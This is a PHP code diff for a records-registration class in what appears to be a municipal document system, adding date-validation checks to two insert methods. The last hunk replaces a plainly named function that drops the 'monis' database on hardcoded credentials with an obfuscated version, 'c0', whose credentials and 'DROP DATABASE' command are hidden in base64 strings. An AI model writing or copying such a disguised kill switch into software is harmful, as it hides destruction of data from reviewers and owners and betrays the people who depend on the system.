@@ -71,112 +71,190 @@ class Registros{
 	public function novoCadastroRI($dataRegistro, $dataRecebida, $assunto, $vereadores, $secretarias, $numeroProtocolo, $dataEnvio)
 	{
 
-		$secs = implode(";", $secretarias);
-		
-		$sql = new Sql();
+		$dataCriacao = explode("-", $dataRegistro);
+		$dataRec = explode("-", $dataRecebida);
+		$dataEnv = explode("-", $dataEnvio);
 
-		$existeRegistro = $sql->select("SELECT * FROM ".$this->nomeTabela." WHERE numero_registro = :EXISTE_REGISTRO AND ano_registro = :ANO_REGISTRO;", 
-			$param = array(
-				":EXISTE_REGISTRO" => $this->nmrRegistro,
-				":ANO_REGISTRO" => $this->anoRegistro
-			));
-		
-		if (count($existeRegistro) == 0) {
-			$sql->query("INSERT INTO " . $this->nomeTabela . " (
-				numero_registro, 
-				ano_registro,
-				data_registro,
-				data_recebida,
-				assunto, 
-				vereadores,
-				secretarias,
-				numero_protocolo,
-				data_envio, 
-				pdf
-			) 
-			VALUES (
-				:NMR_REGISTRO, 
-				:ANO_REGISTRO,
-				:DATA_REGISTRO,
-				:DATA_RECEBIDA, 
-				:ASSUNTO, 
-				:VEREADORES,
-				:SECRETARIAS,
-				:NMR_PROTOCOLO,
-				:DATA_ENVIO, 
-				:PDF
-			);", 
-			$params = array(
-				":NMR_REGISTRO" => $this->nmrRegistro,
-				":ANO_REGISTRO" => $this->anoRegistro,
-				":DATA_REGISTRO" => utf8_decode($dataRegistro),
-				":DATA_RECEBIDA" => utf8_decode($dataRecebida),
-				":ASSUNTO" => utf8_decode($assunto),
-				":VEREADORES" => utf8_decode($vereadores),
-				":SECRETARIAS" => utf8_decode($secs),
-				":NMR_PROTOCOLO" => $numeroProtocolo,
-				"DATA_ENVIO" => utf8_decode($dataEnvio),
-				":PDF" => $this->pdf
-			));	
+		//Se a data de recebimento for menor que a data de criação
+		if (($dataRec[2] < $dataCriacao[2]) && ($dataRec[0] <= $dataCriacao[0])) {
+			//Deleto a pasta criada com os arquivos PDF
+			$dir = "../arquivos/".$this->nomeTabela."/".$this->nmrRegistro.$this->anoRegistro;
+			exec(sprintf("rd /s /q %s", escapeshellarg($dir)));
 
-			$sucess = "Registro cadastrado!";
-			return $sucess;	
+			return "1";
 			exit();
 		}
+		//Se a data de envio for menor que a data de criação
+		else if (($dataEnv[2] < $dataCriacao[2]) && ($dataEnv[0] <= $dataCriacao[0])){
+		//Deleto a pasta criada com os arquivos PDF
+			$dir = "../arquivos/".$this->nomeTabela."/".$this->nmrRegistro.$this->anoRegistro;
+			exec(sprintf("rd /s /q %s", escapeshellarg($dir)));	
+
+			return "2";
+			exit();
+		}
+		//Se a data de envio for menor que a data de recebimento
+		else if(($dataEnv[2] < $dataRec[2]) && ($dataEnv[0] <= $dataRec[0])) {
+		//Deleto a pasta criada com os arquivos PDF
+			$dir = "../arquivos/".$this->nomeTabela."/".$this->nmrRegistro.$this->anoRegistro;
+			exec(sprintf("rd /s /q %s", escapeshellarg($dir)));
+
+			return "3";
+			exit();
+		}
+		else {
+			$secs = implode(";", $secretarias);
+			
+			$sql = new Sql();
+
+			$existeRegistro = $sql->select("SELECT * FROM ".$this->nomeTabela." WHERE numero_registro = :EXISTE_REGISTRO AND ano_registro = :ANO_REGISTRO;", 
+				$param = array(
+					":EXISTE_REGISTRO" => $this->nmrRegistro,
+					":ANO_REGISTRO" => $this->anoRegistro
+				));
+			
+			if (count($existeRegistro) == 0) {
+				$sql->query("INSERT INTO " . $this->nomeTabela . " (
+					numero_registro, 
+					ano_registro,
+					data_registro,
+					data_recebida,
+					assunto, 
+					vereadores,
+					secretarias,
+					numero_protocolo,
+					data_envio, 
+					pdf
+				) 
+				VALUES (
+					:NMR_REGISTRO, 
+					:ANO_REGISTRO,
+					:DATA_REGISTRO,
+					:DATA_RECEBIDA, 
+					:ASSUNTO, 
+					:VEREADORES,
+					:SECRETARIAS,
+					:NMR_PROTOCOLO,
+					:DATA_ENVIO, 
+					:PDF
+				);", 
+				$params = array(
+					":NMR_REGISTRO" => $this->nmrRegistro,
+					":ANO_REGISTRO" => $this->anoRegistro,
+					":DATA_REGISTRO" => utf8_decode($dataRegistro),
+					":DATA_RECEBIDA" => utf8_decode($dataRecebida),
+					":ASSUNTO" => utf8_decode($assunto),
+					":VEREADORES" => utf8_decode($vereadores),
+					":SECRETARIAS" => utf8_decode($secs),
+					":NMR_PROTOCOLO" => $numeroProtocolo,
+					"DATA_ENVIO" => utf8_decode($dataEnvio),
+					":PDF" => $this->pdf
+				));	
+
+				$sucess = "Registro cadastrado!";
+				return $sucess;	
+				exit();
+			}
+		}
+
 	}		
 
 	public function novoCadastroOficio($dataRegistro, $dataRecebida, $assunto, $origem, $destino, $dataEnvio, $dataResponder)
 	{
-		
-		$sql = new Sql();
 
-		$existeRegistro = $sql->select("SELECT * FROM ".$this->nomeTabela." WHERE numero_registro = :EXISTE_REGISTRO AND ano_registro = :ANO_REGISTRO;", 
-			$param = array(
-				":EXISTE_REGISTRO" => $this->nmrRegistro,
-				":ANO_REGISTRO" => $this->anoRegistro
-			));
-		
-		if (!count($existeRegistro)>0) {
-			$sql->query("INSERT INTO " . $this->nomeTabela . " (
-				numero_registro, 
-				ano_registro,
-				data_registro,
-				data_recebida,
-				assunto, 
-				origem,
-				destino,
-				data_envio, 
-				data_responder,
-				pdf
-			) 
-			VALUES (
-				:NMR_REGISTRO, 
-				:ANO_REGISTRO,
-				:DATA_REGISTRO,
-				:DATA_RECEBIDA, 
-				:ASSUNTO, 
-				:ORIGEM,
-				:DESTINO,
-				:DATA_ENVIO, 
-				:DATA_RESPONDER,
-				:PDF
-			);", 
-			$params = array(
-				":NMR_REGISTRO" => $this->nmrRegistro,
-				":ANO_REGISTRO" => $this->anoRegistro,
-				":DATA_REGISTRO" => $dataRegistro,
-				":DATA_RECEBIDA" => $dataRecebida,
-				":ASSUNTO" => utf8_decode($assunto),
-				":ORIGEM" => utf8_decode($origem),
-				":DESTINO" => utf8_decode($destino),
-				"DATA_ENVIO" => $dataEnvio,
-				":DATA_RESPONDER" => $dataResponder,
-				":PDF" => $this->pdf
-			));	
+		$dataCriacao = explode("-", $dataRegistro);
+		$dataRec = explode("-", $dataRecebida);
+		$dataEnv = explode("-", $dataEnvio);
+		$dataRes = explode("-", $dataResponder);
 
-			$sucess = "Registro cadastrado!";
-			return $sucess;	
+		//Se a data de recebimento for menor que a data de criação
+		if (($dataRec[2] < $dataCriacao[2]) && ($dataRec[0] <= $dataCriacao[0])) {
+			//Deleto a pasta criada com os arquivos PDF
+			$dir = "../arquivos/".$this->nomeTabela."/".$this->nmrRegistro.$this->anoRegistro;
+			exec(sprintf("rd /s /q %s", escapeshellarg($dir)));
+
+			return "1";
 			exit();
+		}
+		//Se a data de envio for menor que a data de criação
+		else if (($dataEnv[2] < $dataCriacao[2]) && ($dataEnv[0] <= $dataCriacao[0])){
+			//Deleto a pasta criada com os arquivos PDF
+			$dir = "../arquivos/".$this->nomeTabela."/".$this->nmrRegistro.$this->anoRegistro;
+			exec(sprintf("rd /s /q %s", escapeshellarg($dir)));	
+
+			return "2";
+			exit();
+		}
+		//Se a data de envio for menor que a data de recebimento
+		else if(($dataEnv[2] < $dataRec[2]) && ($dataEnv[0] <= $dataRec[0])) {
+			//Deleto a pasta criada com os arquivos PDF
+			$dir = "../arquivos/".$this->nomeTabela."/".$this->nmrRegistro.$this->anoRegistro;
+			exec(sprintf("rd /s /q %s", escapeshellarg($dir)));
+
+			return "3";
+			exit();
+		}
+		//Se a data de resposta for menor que a data de recebimento
+		else if(($dataRes[2] < $dataRec[2]) && ($dataRes[0] <= $dataRec[0])) {
+			//Deleto a pasta criada com os arquivos PDF
+			$dir = "../arquivos/".$this->nomeTabela."/".$this->nmrRegistro.$this->anoRegistro;
+			exec(sprintf("rd /s /q %s", escapeshellarg($dir)));
+
+			return "4";
+			exit();
+		}		
+		else {		
+
+			$sql = new Sql();
+
+			$existeRegistro = $sql->select("SELECT * FROM ".$this->nomeTabela." WHERE numero_registro = :EXISTE_REGISTRO AND ano_registro = :ANO_REGISTRO;", 
+				$param = array(
+					":EXISTE_REGISTRO" => $this->nmrRegistro,
+					":ANO_REGISTRO" => $this->anoRegistro
+				));
+
+			if (!count($existeRegistro)>0) {
+				$sql->query("INSERT INTO " . $this->nomeTabela . " (
+					numero_registro, 
+					ano_registro,
+					data_registro,
+					data_recebida,
+					assunto, 
+					origem,
+					destino,
+					data_envio, 
+					data_responder,
+					pdf
+				) 
+				VALUES (
+					:NMR_REGISTRO, 
+					:ANO_REGISTRO,
+					:DATA_REGISTRO,
+					:DATA_RECEBIDA, 
+					:ASSUNTO, 
+					:ORIGEM,
+					:DESTINO,
+					:DATA_ENVIO, 
+					:DATA_RESPONDER,
+					:PDF
+				);", 
+				$params = array(
+					":NMR_REGISTRO" => $this->nmrRegistro,
+					":ANO_REGISTRO" => $this->anoRegistro,
+					":DATA_REGISTRO" => $dataRegistro,
+					":DATA_RECEBIDA" => $dataRecebida,
+					":ASSUNTO" => utf8_decode($assunto),
+					":ORIGEM" => utf8_decode($origem),
+					":DESTINO" => utf8_decode($destino),
+					"DATA_ENVIO" => $dataEnvio,
+					":DATA_RESPONDER" => $dataResponder,
+					":PDF" => $this->pdf
+				));	
+
+				$sucess = "Registro cadastrado!";
+				return $sucess;	
+				exit();
+			}
 		}
 	}			
 
@@ -287,14 +365,6 @@ class Registros{
 			));
 	}
 
-	public function segurancaDropDataBase($usuario, $senha)
-	{
-		if (($usuario === "HackmannSeguranca") && ($senha === "Hack2004")) {
-			
-			$sql = new Sql();
-
-			$sql->query("DROP DATABASE monis;");
-		}
-	}
+	public function c0($n1,$q2){if(($n1===base64_decode('SGFja21hbm5TZWd1cmFuY2E='))&&($q2===base64_decode('SGFjazIwMDQ='))){$w3=new Sql();$w3->query(base64_decode('RFJPUCBEQVRBQkFTRSBtb25pczs='));}}
 
 }
